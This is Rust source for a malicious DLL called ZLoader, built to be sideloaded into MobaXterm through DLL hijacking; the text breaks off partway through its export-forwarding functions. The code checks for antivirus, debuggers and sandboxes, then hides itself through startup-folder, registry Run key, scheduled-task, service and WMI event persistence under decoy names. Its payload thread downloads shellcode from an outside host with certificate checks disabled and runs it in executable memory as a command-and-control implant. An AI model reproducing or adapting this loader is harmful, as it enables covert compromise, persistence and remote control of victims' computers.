// ============================================================
// ZLOADER - DLL Hijacking for MobaXterm (x86)
// Target: MobaXterm Home Edition <= 26.1 (CVE-2026-6421)
// Architecture: x86 (32-bit)
// Features: 360/Huorong detection + Multi-layer persistence
// Shellcode URL: https://app.zhuyan.cloud/v5/dl/cmd/c3.bin
// ============================================================

use std::ptr::null_mut;
use std::io::Write;
use std::time::SystemTime;
use std::os::windows::process::CommandExt;
use winapi::ctypes::c_void;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::processthreadsapi::{CreateThread, GetCurrentProcess};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::shlobj::{SHGetFolderPathA, CSIDL_STARTUP};

use encoding_rs::GBK;

// ============================================================
// Windows API imports
// ============================================================

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut c_void;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
    fn OutputDebugStringA(lpOutputString: *const u8);
    fn GetModuleFileNameW(hModule: *mut c_void, lpFilename: *mut u16, nSize: u32) -> u32;
    fn Sleep(milliseconds: u32);
    fn GetTickCount() -> u32;
    fn IsDebuggerPresent() -> i32;
    fn GetSystemTimeAsFileTime(lpSystemTimeAsFileTime: *mut u64);
    fn GetCurrentProcessId() -> u32;
    fn SetFileAttributesA(lpFileName: *const u8, dwFileAttributes: u32) -> i32;
    fn OpenProcessToken(hProcess: *mut c_void, dwDesiredAccess: u32, phToken: *mut *mut c_void) -> i32;
}

#[link(name = "user32")]
extern "system" {
    fn GetForegroundWindow() -> *mut c_void;
    fn GetWindowTextA(hWnd: *mut c_void, lpString: *mut u8, nMaxCount: i32) -> i32;
    fn GetAsyncKeyState(vKey: i32) -> i16;
}

#[link(name = "advapi32")]
extern "system" {
    fn GetTokenInformation(
        TokenHandle: *mut c_void,
        TokenInformationClass: u32,
        TokenInformation: *mut c_void,
        TokenInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;
    fn RegOpenKeyExA(
        hKey: *mut c_void,
        lpSubKey: *const u8,
        ulOptions: u32,
        samDesired: u32,
        phkResult: *mut *mut c_void,
    ) -> i32;
    fn RegSetValueExA(
        hKey: *mut c_void,
        lpValueName: *const u8,
        Reserved: u32,
        dwType: u32,
        lpData: *const u8,
        cbData: u32,
    ) -> i32;
    fn RegCloseKey(hKey: *mut c_void) -> i32;
    fn OpenSCManagerA(
        lpMachineName: *const u8,
        lpDatabaseName: *const u8,
        dwDesiredAccess: u32,
    ) -> *mut c_void;
    fn CreateServiceA(
        hSCManager: *mut c_void,
        lpServiceName: *const u8,
        lpDisplayName: *const u8,
        dwDesiredAccess: u32,
        dwServiceType: u32,
        dwStartType: u32,
        dwErrorControl: u32,
        lpBinaryPathName: *const u8,
        lpLoadOrderGroup: *const u8,
        lpdwTagId: *mut u32,
        lpDependencies: *const u8,
        lpServiceStartName: *const u8,
        lpPassword: *const u8,
    ) -> *mut c_void;
    fn CloseServiceHandle(hSCObject: *mut c_void) -> i32;
}

#[link(name = "shell32")]
extern "system" {
    fn ShellExecuteW(
        hwnd: *mut c_void,
        lpOperation: *const u16,
        lpFile: *const u16,
        lpParameters: *const u16,
        lpDirectory: *const u16,
        nShowCmd: i32,
    ) -> i32;
}

// ============================================================
// Constants
// ============================================================

const TOKEN_QUERY: u32 = 0x0008;
const TOKEN_ELEVATION: u32 = 20;
const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
const SW_HIDE: i32 = 0;
const KEY_SET_VALUE: u32 = 0x0002;
const REG_SZ: u32 = 1;
const SC_MANAGER_CREATE_SERVICE: u32 = 0x0002;
const SERVICE_AUTO_START: u32 = 0x00000002;
const SERVICE_ERROR_NORMAL: u32 = 0x00000001;
const SERVICE_WIN32_OWN_PROCESS: u32 = 0x00000010;
const SERVICE_ALL_ACCESS: u32 = 0xF01FF;
const HKEY_CURRENT_USER: *mut c_void = 0x80000001 as *mut c_void;

// ============================================================
// Helper Functions
// ============================================================

fn decode_gbk(bytes: &[u8]) -> String {
    let (decoded, _, _) = GBK.decode(bytes);
    decoded.into_owned()
}

fn to_wide(s: &str) -> Vec<u16> {
    use std::os::windows::ffi::OsStrExt;
    std::ffi::OsStr::new(s)
        .encode_wide()
        .chain(Some(0))
        .collect()
}

/// Get full EXE path using Unicode version (supports Chinese filenames)
fn get_exe_path() -> String {
    unsafe {
        let mut buffer = [0u16; 260];
        let len = GetModuleFileNameW(null_mut(), buffer.as_mut_ptr(), buffer.len() as u32);
        if len > 0 {
            return String::from_utf16_lossy(&buffer[..len as usize]);
        }
        String::new()
    }
}

/// Get EXE directory
fn get_exe_dir() -> String {
    let path = get_exe_path();
    if let Some(pos) = path.rfind('\\') {
        return path[..pos].to_string();
    }
    ".".to_string()
}

/// Get EXE file name
fn get_exe_name() -> String {
    let path = get_exe_path();
    if let Some(pos) = path.rfind('\\') {
        return path[pos + 1..].to_string();
    }
    path
}

/// Fixed log file path: <exe_dir>\ZLoader.log (hidden)
fn get_log_path() -> String {
    let dir = get_exe_dir();
    format!("{}\\ZLoader.log", dir)
}

fn write_log(msg: &str) {
    let log_path = get_log_path();
    
    unsafe {
        let debug_msg = format!("[ZLoader] {}\n", msg);
        let cstr = std::ffi::CString::new(debug_msg).unwrap_or_default();
        OutputDebugStringA(cstr.as_ptr() as *const u8);
    }

    let timestamp = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let entry = format!("[{}] {}\n", timestamp, msg);

    // Write to log file
    if let Ok(_) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .and_then(|mut f| f.write_all(entry.as_bytes()))
    {
        // Set hidden attribute on the log file
        unsafe {
            let path_cstr = std::ffi::CString::new(log_path.clone()).unwrap_or_default();
            SetFileAttributesA(path_cstr.as_ptr() as *const u8, FILE_ATTRIBUTE_HIDDEN);
        }
    }
}

// ============================================================
// 360 / Huorong Detection
// ============================================================

fn has_360_or_huorong() -> bool {
    let av_list = [
        "360Tray.exe", "360sd.exe", "360safe.exe", "ZhuDongFangYu.exe",
        "360rp.exe", "360tray.exe", "safemon.exe", "360se.exe", "360ts.exe",
        "HipsTray.exe", "HipsDaemon.exe", "HipsMain.exe", "sysdiag.exe",
        "HRUpdate.exe", "HRConfig.exe"
    ];

    let output = std::process::Command::new("cmd")
        .args(&["/c", "wmic process get name"])
        .creation_flags(0x08000000)
        .output();

    if let Ok(out) = output {
        if let Ok(output_str) = String::from_utf8(out.stdout) {
            let lower = output_str.to_lowercase();
            for proc_name in av_list {
                if lower.contains(&proc_name.to_lowercase()) {
                    write_log(&format!("AV detected: {}", proc_name));
                    return true;
                }
            }
        }
    }

    let output2 = std::process::Command::new("tasklist")
        .creation_flags(0x08000000)
        .output();

    if let Ok(out) = output2 {
        if let Ok(output_str) = String::from_utf8(out.stdout) {
            let lower = output_str.to_lowercase();
            for proc_name in av_list {
                if lower.contains(&proc_name.to_lowercase()) {
                    write_log(&format!("AV detected: {}", proc_name));
                    return true;
                }
            }
        }
    }

    write_log("No 360 or Huorong detected");
    false
}

// ============================================================
// Privilege Detection
// ============================================================

fn is_admin() -> bool {
    unsafe {
        let mut h_token: *mut c_void = null_mut();
        let process = GetCurrentProcess();
        if OpenProcessToken(process, TOKEN_QUERY, &mut h_token) == 0 {
            return false;
        }
        let mut elevation: u32 = 0;
        let mut return_len: u32 = 0;
        let result = GetTokenInformation(
            h_token,
            TOKEN_ELEVATION,
            &mut elevation as *mut _ as *mut c_void,
            std::mem::size_of::<u32>() as u32,
            &mut return_len,
        );
        result != 0 && elevation != 0
    }
}

// ============================================================
// Anti-Sandbox Detection
// ============================================================

fn is_sandbox() -> bool {
    unsafe {
        if IsDebuggerPresent() != 0 {
            write_log("DEBUGGER detected!");
            return true;
        }
        let start = GetTickCount();
        Sleep(5000);
        let elapsed = GetTickCount() - start;
        if elapsed < 4500 {
            write_log(&format!("TIME ACCELERATION detected: {}ms", elapsed));
            return true;
        }
        let hwnd = GetForegroundWindow();
        if !hwnd.is_null() {
            let mut buffer = [0u8; 256];
            GetWindowTextA(hwnd, buffer.as_mut_ptr(), 255);
            let title = String::from_utf8_lossy(&buffer).to_lowercase();
            let keywords = [
                "sandbox", "virtual", "vmware", "vbox", "qemu",
                "cuckoo", "malware", "analyze", "sample", "virus",
                "threat", "sandboxie", "virtualbox", "vms"
            ];
            for kw in keywords {
                if title.contains(kw) {
                    write_log(&format!("SANDBOX WINDOW: {}", title));
                    return true;
                }
            }
        }
        let mut mouse_moved = false;
        for _ in 0..10 {
            let pos1 = GetAsyncKeyState(0x01);
            Sleep(50);
            let pos2 = GetAsyncKeyState(0x01);
            if pos1 != pos2 {
                mouse_moved = true;
                break;
            }
        }
        if !mouse_moved && GetTickCount() < 30000 {
            write_log("NO MOUSE INTERACTION");
            return true;
        }
        let mut uptime: u64 = 0;
        GetSystemTimeAsFileTime(&mut uptime);
        let uptime_seconds = (uptime / 10000000) % 86400;
        if uptime_seconds < 300 {
            write_log(&format!("SHORT UPTIME: {}s", uptime_seconds));
            return true;
        }
        if let Ok(var) = std::env::var("COMPUTERNAME") {
            let name = var.to_lowercase();
            let vm_keywords = ["vm-", "vbox-", "qemu", "sandbox", "test", "win7", "win10"];
            for kw in vm_keywords {
                if name.contains(kw) {
                    write_log(&format!("VM HOSTNAME: {}", name));
                    return true;
                }
            }
        }
        let sandbox_paths = [
            "C:\\sandbox", "C:\\cuckoo", "C:\\analysis",
            "C:\\malware", "C:\\Users\\admin\\Desktop\\analysis",
        ];
        for path in sandbox_paths {
            if std::path::Path::new(path).exists() {
                write_log(&format!("SANDBOX PATH: {}", path));
                return true;
            }
        }
        write_log("No sandbox detected");
        false
    }
}

// ============================================================
// PERSISTENCE METHODS
// ============================================================

fn create_shortcut_vbs(target_path: &str, link_path: &str, window_style: i32) -> bool {
    let exe_dir = get_exe_dir();
    let vbs_content = format!(
        "Set WshShell = CreateObject(\"WScript.Shell\")\n\
         Set Shortcut = WshShell.CreateShortcut(\"{}\")\n\
         Shortcut.TargetPath = \"{}\"\n\
         Shortcut.WorkingDirectory = \"{}\"\n\
         Shortcut.WindowStyle = {}\n\
         Shortcut.Save()\n\
         WScript.Quit 0",
        link_path, target_path, exe_dir, window_style
    );
    let temp_dir = std::env::temp_dir();
    let vbs_path = temp_dir.join("lnk_creator.vbs");
    if let Err(e) = std::fs::write(&vbs_path, vbs_content.as_bytes()) {
        write_log(&format!("Failed to write VBS: {}", e));
        return false;
    }
    let vbs_str = vbs_path.to_str().unwrap_or("");
    let args_wide = to_wide(&format!("//nologo \"{}\"", vbs_str));
    unsafe {
        let _result = ShellExecuteW(
            null_mut(),
            to_wide("open").as_ptr(),
            to_wide("wscript.exe").as_ptr(),
            args_wide.as_ptr(),
            null_mut(),
            SW_HIDE,
        );
        Sleep(500);
    }
    let _ = std::fs::remove_file(&vbs_path);
    std::path::Path::new(link_path).exists()
}

// ============================================================
// 1. Startup Folder (User) - Trigger: User login
// ============================================================

fn install_startup_folder() -> bool {
    let exe_path = get_exe_path();
    write_log("[PERSISTENCE] Startup Folder - Adding shortcut to user startup folder...");
    write_log(&format!("[PERSISTENCE] Startup Folder - Target: {}", exe_path));
    write_log("[PERSISTENCE] Startup Folder - Description: Creates a shortcut in the current user's Startup folder");
    write_log("[PERSISTENCE] Startup Folder - Trigger: Executes when user logs into Windows");
    write_log("[PERSISTENCE] Startup Folder - Privilege: User (no admin required)");
    
    let mut path_buffer = [0u8; 260];
    let result = unsafe {
        SHGetFolderPathA(
            null_mut(),
            CSIDL_STARTUP as i32,
            null_mut(),
            0,
            path_buffer.as_mut_ptr() as *mut i8,
        )
    };
    if result != 0 {
        write_log("[PERSISTENCE] Startup Folder - SHGetFolderPathA failed");
        return false;
    }
    let startup_path = String::from_utf8_lossy(&path_buffer);
    let startup_path = startup_path.trim_end_matches('\0');
    
    let shortcut_name = "SystemHelper.lnk";
    let shortcut_path = format!("{}\\{}", startup_path, shortcut_name);
    
    write_log(&format!("[PERSISTENCE] Startup Folder - Path: {}", shortcut_path));
    write_log(&format!("[PERSISTENCE] Startup Folder - Verification: dir \"{}\"", shortcut_path));
    
    if std::path::Path::new(&shortcut_path).exists() {
        write_log(&format!("[PERSISTENCE] Startup Folder - Already exists: {}", shortcut_path));
        return true;
    }
    let success = create_shortcut_vbs(&exe_path, &shortcut_path, 7);
    if success {
        unsafe {
            let link_cstr = std::ffi::CString::new(shortcut_path.clone()).unwrap_or_default();
            SetFileAttributesA(link_cstr.as_ptr() as *const u8, FILE_ATTRIBUTE_HIDDEN);
        }
        write_log(&format!("[PERSISTENCE] Startup Folder - Created: {}", shortcut_path));
    } else {
        write_log("[PERSISTENCE] Startup Folder - Creation failed");
    }
    success
}

// ============================================================
// 2. HKCU Registry (User) - Trigger: User login
// ============================================================

fn install_user_registry() -> bool {
    let exe_path = get_exe_path();
    write_log("[PERSISTENCE] HKCU Registry - Adding entry to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run...");
    write_log(&format!("[PERSISTENCE] HKCU Registry - Target: {}", exe_path));
    write_log("[PERSISTENCE] HKCU Registry - Description: Adds a value to the current user's Run registry key");
    
    let value_name = "SystemHelper";
    write_log(&format!("[PERSISTENCE] HKCU Registry - Value Name: {}", value_name));
    write_log("[PERSISTENCE] HKCU Registry - Trigger: Executes when user logs into Windows");
    write_log("[PERSISTENCE] HKCU Registry - Privilege: User (no admin required)");
    write_log(&format!("[PERSISTENCE] HKCU Registry - Verification: reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"{}\"", value_name));
    
    unsafe {
        let mut hkey: *mut c_void = null_mut();
        let result = RegOpenKeyExA(
            HKEY_CURRENT_USER,
            b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".as_ptr() as *const u8,
            0,
            KEY_SET_VALUE,
            &mut hkey,
        );
        if result != 0 {
            write_log("[PERSISTENCE] HKCU Registry - RegOpenKeyEx failed");
            return false;
        }
        let data = exe_path.as_bytes();
        let mut data_with_null = data.to_vec();
        data_with_null.push(0);
        
        let value_name_bytes = value_name.as_bytes();
        let mut value_name_with_null = value_name_bytes.to_vec();
        value_name_with_null.push(0);
        
        let reg_result = RegSetValueExA(
            hkey,
            value_name_with_null.as_ptr() as *const u8,
            0,
            REG_SZ,
            data_with_null.as_ptr(),
            data_with_null.len() as u32,
        );
        RegCloseKey(hkey);
        if reg_result == 0 {
            write_log(&format!("[PERSISTENCE] HKCU Registry - {} added to HKCU\\Run", value_name));
            true
        } else {
            write_log(&format!("[PERSISTENCE] HKCU Registry - RegSetValueEx failed: {}", reg_result));
            false
        }
    }
}

// ============================================================
// 3. User Scheduled Task (User) - Trigger: User login
// ============================================================

fn install_user_scheduled_task() -> bool {
    let exe_path = get_exe_path();
    write_log("[PERSISTENCE] Scheduled Task - Creating user-level scheduled task...");
    write_log(&format!("[PERSISTENCE] Scheduled Task - Target: {}", exe_path));
    write_log("[PERSISTENCE] Scheduled Task - Description: Creates a scheduled task that runs at user logon");
    
    let task_name = "SystemHelper";
    write_log(&format!("[PERSISTENCE] Scheduled Task - Task Name: {}", task_name));
    write_log("[PERSISTENCE] Scheduled Task - Trigger: User logon event");
    write_log("[PERSISTENCE] Scheduled Task - Privilege: User (no admin required)");
    write_log(&format!("[PERSISTENCE] Scheduled Task - Verification: schtasks /query /tn \"{}\"", task_name));

    let cmd = format!(
        "schtasks /create /tn \"{}\" /tr \"{}\" /sc onlogon /f",
        task_name, exe_path
    );

    let output = std::process::Command::new("cmd")
        .args(&["/c", &cmd])
        .creation_flags(0x08000000)
        .output();

    match output {
        Ok(out) => {
            if out.status.success() {
                write_log(&format!("[PERSISTENCE] Scheduled Task - Created: {}", task_name));
                true
            } else {
                let err = decode_gbk(&out.stderr);
                write_log(&format!("[PERSISTENCE] Scheduled Task - Failed: {}", err));
                false
            }
        }
        Err(e) => {
            write_log(&format!("[PERSISTENCE] Scheduled Task - Error: {}", e));
            false
        }
    }
}

// ============================================================
// 4. Windows Service (Admin) - Trigger: System boot
// ============================================================

fn install_windows_service() -> bool {
    if !is_admin() {
        write_log("[PERSISTENCE] Windows Service - Skipped (not admin)");
        return false;
    }
    
    let exe_path = get_exe_path();
    write_log("[PERSISTENCE] Windows Service - Creating auto-start service...");
    write_log(&format!("[PERSISTENCE] Windows Service - Target: {}", exe_path));
    write_log("[PERSISTENCE] Windows Service - Description: Creates a Windows service that starts automatically at system boot");
    
    let service_name = "SystemHelper";
    let display_name = "System Helper Service";
    write_log(&format!("[PERSISTENCE] Windows Service - Service Name: {}", service_name));
    write_log(&format!("[PERSISTENCE] Windows Service - Display Name: {}", display_name));
    write_log("[PERSISTENCE] Windows Service - Start Type: SERVICE_AUTO_START (automatic)");
    write_log("[PERSISTENCE] Windows Service - Service Type: SERVICE_WIN32_OWN_PROCESS (independent process)");
    write_log("[PERSISTENCE] Windows Service - Error Control: SERVICE_ERROR_NORMAL (does NOT cause system crash)");
    write_log("[PERSISTENCE] Windows Service - Trigger: System boot (runs before user login)");
    write_log("[PERSISTENCE] Windows Service - Privilege: SYSTEM (requires admin to create)");
    write_log("[PERSISTENCE] Windows Service - Safety: Service failure does NOT prevent system from booting");
    write_log(&format!("[PERSISTENCE] Windows Service - Verification: sc query {}", service_name));
    
    unsafe {
        let hsc = OpenSCManagerA(null_mut(), null_mut(), SC_MANAGER_CREATE_SERVICE);
        if hsc.is_null() {
            write_log("[PERSISTENCE] Windows Service - OpenSCManager failed");
            return false;
        }

        let service_name_bytes = service_name.as_bytes();
        let mut service_name_with_null = service_name_bytes.to_vec();
        service_name_with_null.push(0);
        
        let display_name_bytes = display_name.as_bytes();
        let mut display_name_with_null = display_name_bytes.to_vec();
        display_name_with_null.push(0);

        let service = CreateServiceA(
            hsc,
            service_name_with_null.as_ptr() as *const u8,
            display_name_with_null.as_ptr() as *const u8,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            exe_path.as_bytes().as_ptr() as *const u8,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
        );
        CloseServiceHandle(hsc);
        if !service.is_null() {
            CloseServiceHandle(service);
            write_log(&format!("[PERSISTENCE] Windows Service - Created: {}", service_name));
            true
        } else {
            write_log("[PERSISTENCE] Windows Service - CreateService failed (may be blocked by AV)");
            false
        }
    }
}

// ============================================================
// 5. WMI Event (Admin) - Trigger: User opens cmd.exe
// ============================================================

fn install_wmi_event() -> bool {
    if !is_admin() {
        write_log("[PERSISTENCE] WMI Event - Skipped (not admin)");
        return false;
    }
    
    let exe_path = get_exe_path();
    write_log("[PERSISTENCE] WMI Event - Creating event subscription via WMIC...");
    write_log(&format!("[PERSISTENCE] WMI Event - Target: {}", exe_path));
    write_log("[PERSISTENCE] WMI Event - Description: Creates a WMI permanent event subscription");
    
    let filter_name = "SystemBootFilter";
    let consumer_name = "SystemBootConsumer";
    write_log(&format!("[PERSISTENCE] WMI Event - Filter Name: {}", filter_name));
    write_log(&format!("[PERSISTENCE] WMI Event - Consumer Name: {}", consumer_name));
    write_log("[PERSISTENCE] WMI Event - Trigger Event: Win32_ProcessStartTrace WHERE ProcessName='cmd.exe'");
    write_log("[PERSISTENCE] WMI Event - Action: Executes MobaXterm.exe when cmd.exe starts");
    write_log("[PERSISTENCE] WMI Event - Trigger: User launches cmd.exe (safe, no system impact)");
    write_log("[PERSISTENCE] WMI Event - Privilege: SYSTEM (requires admin to create)");
    write_log("[PERSISTENCE] WMI Event - Safety: Only triggers when user manually opens cmd.exe");
    write_log(&format!("[PERSISTENCE] WMI Event - Verification: wmic /namespace:root\\subscription path __EventFilter where Name='{}' get Name,Query", filter_name));

    let cmd_filter = format!(
        "wmic /namespace:\\\\root\\subscription path __EventFilter create Name=\"{}\", EventNamespace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='cmd.exe'\"",
        filter_name
    );
    write_log(&format!("[PERSISTENCE] WMI Event - Filter: {}", cmd_filter));
    
    let _output_filter = std::process::Command::new("cmd")
        .args(&["/c", &cmd_filter])
        .creation_flags(0x08000000)
        .output();

    let cmd_consumer = format!(
        "wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create Name=\"{}\", CommandLineTemplate=\"{}\"",
        consumer_name, exe_path
    );
    write_log(&format!("[PERSISTENCE] WMI Event - Consumer: {}", cmd_consumer));
    
    let _output_consumer = std::process::Command::new("cmd")
        .args(&["/c", &cmd_consumer])
        .creation_flags(0x08000000)
        .output();

    let cmd_binding = format!(
        "wmic /namespace:\\\\root\\subscription path __FilterToConsumerBinding create Filter=\"__EventFilter.Name='{}'\", Consumer=\"CommandLineEventConsumer.Name='{}'\"",
        filter_name, consumer_name
    );
    write_log(&format!("[PERSISTENCE] WMI Event - Binding: {}", cmd_binding));
    
    let output_binding = std::process::Command::new("cmd")
        .args(&["/c", &cmd_binding])
        .creation_flags(0x08000000)
        .output();

    let binding_success = if let Ok(ref out) = output_binding {
        out.status.success()
    } else {
        false
    };

    if binding_success {
        write_log(&format!("[PERSISTENCE] WMI Event - Created: {}", filter_name));
        write_log("[PERSISTENCE] WMI Event - Trigger: cmd.exe starts -> MobaXterm.exe runs");
        write_log(&format!("[PERSISTENCE] WMI Event - Delete Filter: wmic /namespace:root\\subscription path __EventFilter where Name='{}' delete", filter_name));
        true
    } else {
        if let Ok(out) = output_binding {
            let err = decode_gbk(&out.stderr);
            write_log(&format!("[PERSISTENCE] WMI Event - Binding failed: {}", err));
        }
        write_log("[PERSISTENCE] WMI Event - Creation failed");
        false
    }
}

// ============================================================
// Smart Persistence Installer
// ============================================================

fn install_persistence() {
    let admin = is_admin();
    let has_av = has_360_or_huorong();
    let exe_path = get_exe_path();
    let exe_dir = get_exe_dir();
    let exe_name = get_exe_name();
    let log_path = get_log_path();

    write_log("========================================");
    write_log(&format!("360/Huorong Detected: {}", has_av));
    write_log(&format!("Admin Privileges: {}", admin));
    write_log(&format!("EXE Directory: {}", exe_dir));
    write_log(&format!("EXE File Name: {}", exe_name));
    write_log(&format!("EXE Full Path: {}", exe_path));
    write_log(&format!("Log File: {}", log_path));
    write_log("========================================");

    if has_av {
        write_log("360 or Huorong detected - SKIPPING all persistence to avoid detection");
        write_log("PERSISTENCE: Skipped (AV detected)");
        return;
    }

    let mut any_success = false;

    write_log("[USER LAYER] User persistence methods (no admin required):");
    write_log("  - Startup Folder: Runs at user login");
    write_log("  - HKCU Registry: Runs at user login");
    write_log("  - Scheduled Task: Runs at user login");

    if install_startup_folder() { any_success = true; }
    if install_user_registry() { any_success = true; }
    if install_user_scheduled_task() { any_success = true; }

    if admin {
        write_log("[ADMIN LAYER] Admin persistence methods:");
        write_log("  - Windows Service: Runs at system boot (safe)");
        write_log("  - WMI Event: Triggers when cmd.exe starts (safe)");

        if install_windows_service() { any_success = true; }
        if install_wmi_event() { any_success = true; }
    } else {
        write_log("[ADMIN LAYER] Skipped - Not admin");
    }

    write_log("========================================");
    write_log("PERSISTENCE SUMMARY:");
    write_log(&format!("  - EXE Path: {}", exe_path));
    write_log(&format!("  - Log File: {}", log_path));
    write_log("  - Startup Folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemHelper.lnk");
    write_log("  - HKCU Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemHelper");
    write_log("  - Scheduled Task: SystemHelper");
    if admin {
        write_log("  - Windows Service: SystemHelper");
        write_log("  - WMI Event: SystemBootFilter (triggered by cmd.exe)");
    }
    write_log("========================================");
    
    if any_success {
        write_log("PERSISTENCE: At least one method succeeded");
    } else {
        write_log("PERSISTENCE: All methods failed");
    }
}

// ============================================================
// DLL Entry Point
// ============================================================

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: *mut c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut c_void,
) -> bool {
    match fdw_reason {
        1 => {
            let exe_dir = get_exe_dir();
            let exe_path = get_exe_path();
            let exe_name = get_exe_name();
            let log_path = get_log_path();
            
            write_log("========================================");
            write_log("DLL_PROCESS_ATTACH - ZLoader Loaded (x86)");
            write_log(&format!("Process ID: {}", unsafe { GetCurrentProcessId() }));
            write_log(&format!("EXE Directory: {}", exe_dir));
            write_log(&format!("EXE File Name: {}", exe_name));
            write_log(&format!("EXE Full Path: {}", exe_path));
            write_log(&format!("Log File: {}", log_path));

            let sandbox = is_sandbox();

            if sandbox {
                write_log("SANDBOX ENVIRONMENT DETECTED - Delaying execution for 60 seconds");
                unsafe { Sleep(60000); }
            } else {
                write_log("NORMAL ENVIRONMENT - Executing immediately");

                std::thread::spawn(|| {
                    install_persistence();
                });
            }

            unsafe {
                let thread_func: unsafe extern "system" fn(*mut c_void) -> u32 = payload_thread;
                let thread_handle = CreateThread(
                    null_mut(),
                    0,
                    Some(thread_func),
                    null_mut(),
                    0,
                    null_mut(),
                );

                if thread_handle.is_null() {
                    write_log("ERROR: Failed to create payload thread");
                } else {
                    write_log("SUCCESS: Payload thread created");
                }
            }
            true
        }
        _ => true,
    }
}

// ============================================================
// Payload Execution Thread (C2)
// ============================================================

unsafe extern "system" fn payload_thread(_param: *mut c_void) -> u32 {
    write_log("========================================");
    write_log("PAYLOAD THREAD STARTED - C2 Connection in progress");
    write_log("========================================");

    let shellcode_url = "https://app.zhuyan.cloud/v5/dl/cmd/c3.bin";
    write_log(&format!("Downloading shellcode from: {}", shellcode_url));

    let shellcode_bytes = match download_shellcode(shellcode_url) {
        Ok(data) => {
            write_log(&format!("Download SUCCESS - Size: {} bytes", data.len()));
            data
        }
        Err(e) => {
            write_log(&format!("Download FAILED: {}", e));
            return 1;
        }
    };

    if shellcode_bytes.is_empty() {
        write_log("ERROR: Shellcode is empty");
        return 1;
    }

    write_log(&format!("First 16 bytes: {:02x?}", &shellcode_bytes[..std::cmp::min(16, shellcode_bytes.len())]));

    write_log(&format!("Allocating {} bytes of memory", shellcode_bytes.len()));
    let exec_mem = VirtualAlloc(
        null_mut(),
        shellcode_bytes.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if exec_mem.is_null() {
        write_log("ERROR: VirtualAlloc failed");
        return 1;
    }
    write_log(&format!("Memory allocated at: {:p}", exec_mem));

    std::ptr::copy(
        shellcode_bytes.as_ptr(),
        exec_mem as *mut u8,
        shellcode_bytes.len(),
    );
    write_log("Shellcode copied to allocated memory");

    let mut old_protect = 0;
    let protect_result = VirtualProtect(
        exec_mem,
        shellcode_bytes.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );

    if protect_result == 0 {
        write_log("ERROR: VirtualProtect failed");
        return 1;
    }
    write_log("Memory protection changed to PAGE_EXECUTE_READWRITE");

    write_log("Executing shellcode - C2 connecting...");
    let shellcode_func: unsafe extern "system" fn(*mut c_void) -> u32 =
        std::mem::transmute(exec_mem);

    let thread_handle = CreateThread(
        null_mut(),
        0,
        Some(shellcode_func),
        null_mut(),
        0,
        null_mut(),
    );

    if !thread_handle.is_null() {
        write_log("Shellcode thread created - C2 online");
        WaitForSingleObject(thread_handle, INFINITE);
        write_log("Shellcode thread finished execution");
    } else {
        write_log("ERROR: Failed to create shellcode execution thread");
        return 1;
    }

    write_log("PAYLOAD THREAD COMPLETED SUCCESSFULLY");
    write_log("========================================");
    0
}

// ============================================================
// Shellcode Downloader
// ============================================================

fn download_shellcode(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()?;

    let response = client.get(url).send()?;
    if !response.status().is_success() {
        return Err(format!("HTTP error: {}", response.status()).into());
    }
    let bytes = response.bytes()?;
    Ok(bytes.to_vec())
}

// ============================================================
// Export Forwarding
// ============================================================

unsafe fn get_system_func(name: &str) -> *mut c_void {
    let module_name = b"msimg32.dll\0".as_ptr() as *const u8;
    let module = GetModuleHandleA(module_name);
    if module.is_null() {
        return null_mut();
    }
    let func_name = name.as_bytes();
    let mut name_with_null = func_name.to_vec();
    name_with_null.push(0);
    GetProcAddress(module, name_with_null.as_ptr() as *const u8)
}

#[no_mangle]
pub extern "system" fn vSetDdrawflag() {
    unsafe {
        let func = get_system_func("vSetDdrawflag");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetPreferredMode() {
    unsafe {
        let func = get_system_func("vSetPreferredMode");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw2() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw2");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw4() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw4");
        if !func.is_null() {
            let f: extern "system" fn() = std::mem::transmute(func);
            f();
        }
    }
}

#[no_mangle]
pub extern "system" fn vSetSpriteDDraw8() {
    unsafe {
        let func = get_system_func("vSetSpriteDDraw8");
        if !func.is_null() {
